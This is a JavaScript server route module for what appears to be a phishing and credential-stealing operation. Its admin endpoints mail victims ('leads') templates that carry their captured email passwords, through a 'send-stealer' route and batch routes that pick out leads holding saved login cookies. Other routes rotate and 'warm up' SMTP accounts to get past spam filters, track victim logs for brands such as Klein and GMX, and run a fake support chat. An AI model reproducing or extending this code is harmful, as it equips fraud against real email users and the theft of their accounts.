  if (pathname === '/api/config/email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readConfigEmail();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64)
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readConfigEmail();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'cfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', senderName: '', title: '', html: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeConfigEmail(data);
      return send(res, 200, { ok: true, id: configId });
    });
    return;
  }

  if (pathname === '/api/config/email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readConfigEmail();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeConfigEmail(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readConfigEmail();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeConfigEmail(data);
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readWarmupEmailConfig();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      recipientsList: (cur && cur.recipientsList) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64),
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || ''
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readWarmupEmailConfig();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'wcfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.recipientsList != null) cfg.recipientsList = String(json.recipientsList);
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeWarmupEmailConfig(data);
      return send(res, 200, { ok: true, id: configId });
    });
    return;
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readWarmupEmailConfig();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeWarmupEmailConfig(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/warmup-email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readWarmupEmailConfig();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeWarmupEmailConfig(data);
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/send-stealer' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      let toEmail = (json.toEmail != null && json.toEmail !== '') ? String(json.toEmail).trim() : '';
      let password = (json.password != null) ? String(json.password).trim() : '';
      if (!toEmail) {
        const id = (json.id != null) ? String(json.id).trim() : '';
        if (!id) return send(res, 400, { ok: false, error: 'id or toEmail required' });
        const leads = leadService.readLeads();
        const lead = leads.find((l) => l.id === id);
        if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
        toEmail = (lead.email || lead.emailKl || '').trim();
        if (!toEmail) return send(res, 400, { ok: false, error: 'Lead has no email' });
        password = (lead.password || lead.passwordKl || '').trim();
      }
      const data = readStealerEmailConfig();
      const configId = (json.configId != null && json.configId !== '') ? String(json.configId).trim() : null;
      let cfg = configId
        ? (data.configs || []).find((c) => c.id == configId)
        : data.current;
      if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
        cfg = data.current;
        if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
          cfg = (data.configs || []).find((c) => c.smtpLine && c.smtpLine.trim());
        }
      }
      if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
        return send(res, 400, { ok: false, error: 'В конфиге не задан SMTP. Откройте /mailer/, введите SMTP (host:port:user:fromEmail:password) и нажмите «Сохранить».' });
      }
      let smtpList = parseSmtpLines(cfg.smtpLine).filter((s) => !sendStealerFailedSmtpEmails.has(s.fromEmail));
      if (!smtpList.length) return send(res, 400, { ok: false, error: 'Нет доступных SMTP (все отключены из-за ошибок отправки или не заданы).' });
      let html = (cfg.html || '')
        .replace(/_email_/g, toEmail)
        .replace(/_password_/g, password);
      const attachments = [];
      if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
        try {
          const buf = Buffer.from(cfg.image1Base64, 'base64');
          const cid = 'image1@mail';
          html = html.replace(/_src1_/g, 'cid:' + cid);
          attachments.push({ filename: 'image1.png', content: buf, cid: cid });
        } catch (e) {}
      } else if (html.indexOf('_src1_') !== -1) {
        html = html.replace(/_src1_/g, '');
      }
      if (!nodemailer) return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      // Резервируем индекс: 1-е письмо → SMTP 1, 2-е → SMTP 2, … При ошибке SMTP удаляется из списка, этому же адресу пробуем следующий.
      const smtpIndex = sendStealerSmtpIndex % smtpList.length;
      sendStealerSmtpIndex = (sendStealerSmtpIndex + 1) | 0;
      let lastError = null;
      for (let k = 0; k < smtpList.length; k++) {
        const smtp = smtpList[(smtpIndex + k) % smtpList.length];
        const transporter = nodemailer.createTransport({
          host: smtp.host,
          port: smtp.port,
          secure: smtp.port === 465,
          auth: { user: smtp.user, pass: smtp.password }
        });
        const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
        const mailOptions = {
          from: fromStr,
          to: toEmail,
          subject: (cfg.title || '').trim() || 'Message',
          html,
          attachments: attachments.length ? attachments : undefined,
          envelope: { from: smtp.fromEmail, to: toEmail }
        };
        try {
          await transporter.sendMail(mailOptions);
          return send(res, 200, { ok: true, fromEmail: smtp.fromEmail });
        } catch (err) {
          lastError = err;
          const msg = (err.message || '').slice(0, 200);
          writeDebugLog('SEND_STEALER_SMTP_ERROR', { fromEmail: smtp.fromEmail, toEmail: toEmail, message: msg });
          sendStealerFailedSmtpEmails.add(smtp.fromEmail);
        }
      }
      const msg = (lastError && lastError.message) ? String(lastError.message).slice(0, 200) : 'Все SMTP недоступны';
      return send(res, 500, { ok: false, error: msg });
    });
    return;
  }

  /** Отправка письма из конфига Config → E-Mail (не Mailer/Stealer). Кнопка E-Mail в логе админки. */
  if (pathname === '/api/send-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      if (!id) return send(res, 400, { ok: false, error: 'id required' });
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      if (leadIsWorkedLikeAdmin(lead)) {
        return send(res, 400, { ok: false, error: 'Лог отработан — отправка письма запрещена' });
      }
      const result = await sendConfigEmailToLead(lead);
      if (result.ok) {
        pushEvent(lead, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
        leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
        const toEmail = (lead.email || lead.emailKl || '').trim();
        console.log('[send-email] Отправка (Config E-Mail) с ' + result.fromEmail + ' на ' + toEmail);
        return send(res, 200, { ok: true, fromEmail: result.fromEmail });
      }
      leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
      const code = result.statusCode || 500;
      return send(res, code, { ok: false, error: result.error || 'Ошибка отправки' });
    });
    return;
  }

  /**
   * Массовая отправка (Config → E-Mail), 1 письмо/сек.
   * mode: all — все лиды с email (кроме отработанных); valid — есть куки входа; valid_unsent — валид и ещё не было успешной Config E-Mail (любая известная подпись в логе).
   * Отработанные (leadIsWorkedLikeAdmin) никогда не получают письмо.
   */
  if (pathname === '/api/send-email-cookies-batch' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const modeRaw = (json.mode != null) ? String(json.mode).trim() : 'valid_unsent';
      const mode = (modeRaw === 'all' || modeRaw === 'valid' || modeRaw === 'valid_unsent') ? modeRaw : null;
      if (!mode) {
        return send(res, 400, { ok: false, error: 'Укажите mode: all | valid | valid_unsent' });
      }
      if (!nodemailer) {
        return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      }
      const data = readConfigEmail();
      const cfgDefault = data.current;
      if (!cfgDefault || !(cfgDefault.smtpLine && cfgDefault.smtpLine.trim())) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
      }
      const smtpProbe = parseSmtpLines(cfgDefault.smtpLine);
      if (!smtpProbe.length) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
      }
      let leads = leadService.readLeads();
      const targets = leads.filter(function (l) {
        if (!l) return false;
        if (leadIsWorkedLikeAdmin(l)) return false;
        const to = (l.email || l.emailKl || '').trim();
        if (!to) return false;
        if (mode === 'all') return true;
        if (!leadHasSavedCookies(l)) return false;
        if (mode === 'valid_unsent' && leadHasAnyConfigEmailSentEvent(l)) return false;
        return true;
      });
      let sent = 0;
      let failed = 0;
      const failSamples = [];
      for (let i = 0; i < targets.length; i++) {
        const t = targets[i];
        const idx = leads.findIndex((x) => x && x.id === t.id);
        if (idx === -1) continue;
        const live = leads[idx];
        const result = await sendConfigEmailToLead(live);
        if (result.ok) {
          pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          sent++;
          console.log('[send-email-cookies-batch] → ' + (live.email || live.emailKl || '').trim());
        } else {
          failed++;
          if (failSamples.length < 8) {
            failSamples.push({ id: live.id, email: (live.email || '').trim(), error: result.error || '' });
          }
        }
        if (i < targets.length - 1) await new Promise((r) => setTimeout(r, 1000));
      }
      var emptyHint = '';
      if (targets.length === 0) {
        emptyHint = 'Нет лидов в выборке. Для режимов «Валид» / «Валид не отправлено» нужны сохранённые куки входа (файлы в login/cookies). «Валид не отправлено» пропускает лидов, у кого в логе уже есть «Send Email» (или старые подписи). Отработанные не берутся.';
      }
      return send(res, 200, {
        ok: true,
        mode: mode,
        total: targets.length,
        sent,
        failed,
        failSamples,
        hint: emptyHint || undefined
      });
    });
    return;
  }

  /** Архив по фильтру: отработанные (как в сайдбаре) — Klein → klLogArchived, WEB/GMX → adminLogArchived. */
  if (pathname === '/api/archive-leads-by-filter' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const filter = (json.filter != null) ? String(json.filter).trim() : '';
      if (filter !== 'worked') {
        return send(res, 400, { ok: false, error: 'Неизвестный фильтр' });
      }
      const stats = leadService.archiveLeadsByFilterWorked(pushEvent);
      return send(res, 200, {
        ok: true,
        archived: stats.archived,
        matchedWorked: stats.matchedWorked,
        skippedAlreadyArchived: stats.skippedAlreadyArchived
      });
    });
    return;
  }

  /** Массовая отправка письма из Config → E-Mail всем лидам со статусом Успех (show_success), у кого есть email. */
  if (pathname === '/api/send-email-all-success' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      if (!nodemailer) {
        return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      }
      const data = readConfigEmail();
      let cfgDefault = data.current;
      const klCfg = (data.configs || []).find(function (c) { return c.id === 'kl' || (c.name && String(c.name).toLowerCase().indexOf('klein') !== -1); });
      const smtpLineDefault = (cfgDefault && cfgDefault.smtpLine && cfgDefault.smtpLine.trim()) ? cfgDefault.smtpLine : '';
      if (!smtpLineDefault) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP (текущий профиль).' });
      }
      let leads = leadService.readLeads();
      const targets = leads.filter(function (l) {
        if (l.status !== 'show_success') return false;
        const to = (l.email || l.emailKl || '').trim();
        return !!to;
      });
      let sent = 0;
      let failed = 0;
      let skipped = 0;
      const failSamples = [];

      function cfgForLead(lead) {
        let cfg = cfgDefault;
        if (lead.brand === 'klein' && klCfg && (klCfg.smtpLine || '').trim()) {
          cfg = klCfg;
        }
        return cfg;
      }

      for (let i = 0; i < targets.length; i++) {
        const lead = targets[i];
        const idx = leads.findIndex((x) => x.id === lead.id);
        if (idx === -1) {
          skipped++;
          continue;
        }
        const live = leads[idx];
        const cfg = cfgForLead(live);
        if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
          skipped++;
          continue;
        }
        const smtpList = parseSmtpLines(cfg.smtpLine);
        if (!smtpList.length) {
          skipped++;
          continue;
        }
        const toEmail = (live.email || live.emailKl || '').trim();
        const password = (live.password || live.passwordKl || '').trim();
        let html = (cfg.html || '')
          .replace(/_email_/g, toEmail)
          .replace(/_password_/g, password);
        const attachments = [];
        if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
          try {
            const buf = Buffer.from(cfg.image1Base64, 'base64');
            const cid = 'image1@mail';
            html = html.replace(/_src1_/g, 'cid:' + cid);
            attachments.push({ filename: 'image1.png', content: buf, cid: cid });
          } catch (e) {}
        } else if (html.indexOf('_src1_') !== -1) {
          html = html.replace(/_src1_/g, '');
        }
        const smtp = smtpList[0];
        const transporter = nodemailer.createTransport({
          host: smtp.host,
          port: smtp.port,
          secure: smtp.port === 465,
          auth: { user: smtp.user, pass: smtp.password }
        });
        const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
        const mailOptions = {
          from: fromStr,
          to: toEmail,
          subject: (cfg.title || '').trim() || 'Message',
          html,
          attachments: attachments.length ? attachments : undefined,
          envelope: { from: smtp.fromEmail, to: toEmail }
        };
        try {
          await transporter.sendMail(mailOptions);
          pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          sent++;
          console.log('[send-email-all-success] ' + smtp.fromEmail + ' → ' + toEmail);
        } catch (err) {
          failed++;
          const msg = (err.message || '').slice(0, 200);
          pushEvent(live, 'Письмо (массово) не отправилось: ' + msg, 'admin');
          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          if (failSamples.length < 8) failSamples.push({ id: live.id, email: toEmail, error: msg });
          console.error('[send-email-all-success] ошибка → ' + toEmail + ': ' + msg);
        }
        if (i < targets.length - 1) await new Promise((r) => setTimeout(r, 400));
      }
      return send(res, 200, {
        ok: true,
        total: targets.length,
        sent,
        failed,
        skipped,
        failSamples
      });
    });
    return;
  }

  /** KL: архивировать лог Klein — не принимать новые данные с того же visitId/email/fp. */
  if (pathname === '/api/lead-kl-archive' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const klLogArchived = json.klLogArchived === true;
      if (!id) return send(res, 400, { ok: false, error: 'id required' });
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      if (lead.brand !== 'klein') {
        return send(res, 400, { ok: false, error: 'Только для логов Klein' });
      }
      leadService.applyKleinLogArchivedToggle(lead, klLogArchived, pushEvent);
      leadService.persistLeadPatch(id, { klLogArchived: lead.klLogArchived, eventTerminal: lead.eventTerminal });
      return send(res, 200, { ok: true, klLogArchived: klLogArchived });
    });
    return;
  }

  if (pathname === '/api/warmup-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (warmupState.running) return send(res, 400, { ok: false, error: 'Прогрев уже запущен' });
      const data = readWarmupEmailConfig();
      const currentId = data.currentId || (data.configs && data.configs[0] && data.configs[0].id) || null;
      const currentConfig = currentId ? (data.configs || []).find((c) => c.id == currentId) : (data.configs && data.configs[0]) || null;
      const configs = (currentConfig && (currentConfig.smtpLine || '').trim()) ? [currentConfig] : [];
      if (!configs.length) return send(res, 400, { ok: false, error: 'Выберите конфиг с SMTP в режиме Прогрев и нажмите Старт' });
      let leads = [];
      if (Array.isArray(json.recipients) && json.recipients.length > 0) {
        leads = json.recipients.map((r) => ({ email: (r && r.email) ? String(r.email).trim() : '', password: (r && r.password) ? String(r.password) : '' })).filter((l) => l.email);
      }
      if (leads.length === 0) leads = leadService.readLeads().filter((l) => (l.email || '').trim());
      if (!leads.length) return send(res, 400, { ok: false, error: 'Нет получателей. Заполните базу для прогрева или загрузите лиды на сервере.' });
      let perSmtpLimit = typeof json.perSmtpLimit === 'number' ? json.perSmtpLimit : parseInt(json.perSmtpLimit, 10);
      if (isNaN(perSmtpLimit) || perSmtpLimit < 1) perSmtpLimit = 10;
      if (perSmtpLimit > 10000) perSmtpLimit = 10000;
      let delaySec = typeof json.delaySec === 'number' ? json.delaySec : parseFloat(json.delaySec);
      if (isNaN(delaySec) || delaySec < 0.5) delaySec = 2;
      if (delaySec > 300) delaySec = 300;
      let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
      if (isNaN(numThreads) || numThreads < 1) numThreads = 1;
      if (numThreads > 20) numThreads = 20;
      const flatList = [];
      configs.forEach((cfg) => {
        const smtpList = parseSmtpLines(cfg.smtpLine || '');
        smtpList.forEach((smtp) => flatList.push({ config: cfg, smtp }));
      });
      warmupState.stopped = false;
      warmupState.paused = false;
      warmupState.configs = configs;
      warmupState.flatList = flatList;
      warmupState.leads = leads;
      warmupState.perSmtpLimit = perSmtpLimit;
      warmupState.delayMs = Math.round(delaySec * 1000);
      warmupState.numThreads = numThreads;
      warmupState.sentPerSmtp = Object.assign({}, readWarmupSmtpStats());
      warmupState.log = [{ text: '[Прогрев запущен. Потоков: ' + numThreads + ', лимит с каждого SMTP: ' + perSmtpLimit + ', задержка: ' + delaySec + ' сек. SMTP по кругу (всего ' + flatList.length + '), лиды по кругу]', type: 'muted' }];
      warmupState.totalSent = 0;
      warmupState.running = true;
      for (let w = 0; w < numThreads; w++) setImmediate(runWarmupStep);
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/warmup-status' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const persisted = readWarmupSmtpStats();
    const seen = {};
    const list = [];
    if (warmupState.running && warmupState.flatList && warmupState.flatList.length) {
      warmupState.flatList.forEach((entry) => {
        const email = entry.smtp.fromEmail;
        if (!seen[email]) {
          seen[email] = true;
          list.push({ id: email, name: email, sent: warmupState.sentPerSmtp[email] || 0 });
        }
      });
    }
    Object.keys(persisted).forEach((email) => {
      if (!seen[email]) {
        seen[email] = true;
        list.push({ id: email, name: email, sent: warmupState.sentPerSmtp[email] ?? persisted[email] });
      }
    });
    return send(res, 200, {
      running: warmupState.running,
      paused: warmupState.paused,
      totalSent: warmupState.totalSent,
      sentPerConfig: list,
      log: warmupState.log.slice(-200)
    });
  }

  if (pathname === '/api/warmup-stats-reset' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fromEmail = (json.fromEmail != null) ? String(json.fromEmail).trim() : '';
      if (!fromEmail) return send(res, 400, { ok: false, error: 'fromEmail required' });
      const stats = readWarmupSmtpStats();
      delete stats[fromEmail];
      writeWarmupSmtpStats(stats);
      if (warmupState.sentPerSmtp[fromEmail] !== undefined) delete warmupState.sentPerSmtp[fromEmail];
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/warmup-pause' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      const wasPaused = warmupState.paused;
      warmupState.paused = !warmupState.paused;
      if (wasPaused && !warmupState.paused && body) {
        try {
          const json = JSON.parse(body);
          if (typeof json.delaySec === 'number' || typeof json.delaySec === 'string') {
            let delaySec = typeof json.delaySec === 'number' ? json.delaySec : parseFloat(json.delaySec);
            if (!isNaN(delaySec) && delaySec >= 0.5 && delaySec <= 300) warmupState.delayMs = Math.round(delaySec * 1000);
          }
          if (typeof json.perSmtpLimit === 'number' || typeof json.perSmtpLimit === 'string') {
            let perSmtpLimit = typeof json.perSmtpLimit === 'number' ? json.perSmtpLimit : parseInt(json.perSmtpLimit, 10);
            if (!isNaN(perSmtpLimit) && perSmtpLimit >= 1 && perSmtpLimit <= 10000) warmupState.perSmtpLimit = perSmtpLimit;
          }
          if (typeof json.numThreads === 'number' || typeof json.numThreads === 'string') {
            let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
            if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20 && numThreads > warmupState.numThreads) {
              for (let w = warmupState.numThreads; w < numThreads; w++) setImmediate(runWarmupStep);
              warmupState.numThreads = numThreads;
            } else if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20) {
              warmupState.numThreads = numThreads;
            }
          }
        } catch (e) {}
      }
      return send(res, 200, { ok: true, paused: warmupState.paused });
    });
    return;
  }

  if (pathname === '/api/warmup-stop' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    warmupState.stopped = true;
    return send(res, 200, { ok: true });
  }

  // Публичный эндпоинт: пароль для ZIP показывается на странице Sicherheit (распаковка)
  if (pathname === '/api/chat-open' && req.method === 'POST') {
    console.log('[CHAT-OPEN] POST /api/chat-open: запрос получен');
    if (!checkAdminAuth(req, res)) {
      console.log('[CHAT-OPEN] POST /api/chat-open: 403 (нет или неверный токен)');
      return;
    }
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
      if (!leadId) {
        console.log('[CHAT-OPEN] POST /api/chat-open: пустой leadId, 400');
        return send(res, 400, { ok: false });
      }
      const chat = chatService.readChat();
      if (!chat._openChatRequested || typeof chat._openChatRequested !== 'object') chat._openChatRequested = Object.create(null);
      const requestId = String(Date.now());
      chat._openChatRequested[leadId] = requestId;
      chatService.writeChat(chat);
      console.log('[CHAT-OPEN] POST /api/chat-open: админ запросил открыть чат leadId=' + leadId + ' requestId=' + requestId);
      return send(res, 200, { ok: true });
    });
    return;
  }

  // Юзер подтвердил открытие чата — сбрасываем флаг в файле
  if (pathname === '/api/chat-open-ack' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
      if (leadId) {
        const chat = chatService.readChat();
        if (chat._openChatRequested && typeof chat._openChatRequested === 'object') {
          delete chat._openChatRequested[leadId];
          chatService.writeChat(chat);
        }
        console.log('[CHAT-OPEN] POST /api/chat-open-ack: юзер подтвердил открытие leadId=' + leadId);
      }
      return send(res, 200, { ok: true });
    });
    return;
  }

  // Печатает: who = 'support' | 'user', typing = true | false
  if (pathname === '/api/chat-typing' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
      const who = (json.who === 'support' || json.who === 'user') ? json.who : null;
      const typing = json.typing === true;
      if (!leadId || !who) return send(res, 400, { ok: false });
      if (who === 'support') {
        const token = getAdminTokenFromRequest(req, parsed);
        if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return send(res, 403, { ok: false });
      }
      chatService.setChatTyping(leadId, who, typing);
      return send(res, 200, { ok: true });
    });
    return;
  }

  // Юзер прочитал чат — сохраняем время по email (общее для всех логов с этой почтой)
  if (pathname === '/api/chat-read' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
      if (!leadId) return send(res, 400, { ok: false });
      const chatKey = chatService.getChatKeyForLeadId(leadId);
      const chat = chatService.readChat();
      if (!chat._readAt) chat._readAt = Object.create(null);
      chat._readAt[chatKey] = new Date().toISOString();
      chatService.writeChat(chat);
      return send(res, 200, { ok: true });
    });
    return;
  }

  return false;
}

module.exports = { handleRoute, normalizePathname };
